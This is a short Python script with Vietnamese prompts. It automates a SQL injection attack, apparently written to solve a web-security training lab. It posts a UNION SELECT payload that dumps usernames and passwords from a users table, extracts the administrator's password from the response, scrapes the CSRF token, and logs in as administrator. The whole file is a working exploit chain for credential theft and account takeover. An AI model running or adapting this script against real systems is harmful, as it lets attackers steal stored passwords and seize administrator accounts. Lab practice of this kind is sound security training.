import requests
from bs4 import BeautifulSoup

base_url = input("Nhập URL: ").rstrip('/')
stock_url = f"{base_url}/product?productId=1"

payload = "'+UNION+SELECT+username+||+':'+||+password+FROM+users--"

response = requests.post(stock_url, data={"productId": payload, "storeId": "1"})

if response.status_code != 200:
    print(f"Không thể thực hiện POST, mã lỗi: {response.status_code}")
    exit()

print("Phản hồi từ server:")
print(response.text)

lines = response.text.splitlines()
admin_cred = None

for line in lines:
    if "administrator~" in line:
        admin_cred = line
        break

if not admin_cred:
    print("Không tìm thấy thông tin administrator.")
    exit()

admin_info = admin_cred.split("administrator~")[-1].split('<')[0].strip()
print(f"[+] Đã tìm thấy mật khẩu administrator: {admin_info}")

login_url = f"{base_url}/login"
session = requests.Session()

login_page = session.get(login_url)
soup = BeautifulSoup(login_page.text, 'html.parser')
csrf = soup.find("input", {"name": "csrf"})["value"]

data = {
    "csrf": csrf,
    "username": "administrator",
    "password": admin_info
}
resp = session.post(login_url, data=data)

if "Log out" in resp.text or "My account" in resp.text:
    print("Đăng nhập thành công với tài khoản administrator!")
else:
    print(" Đăng nhập thất bại.")
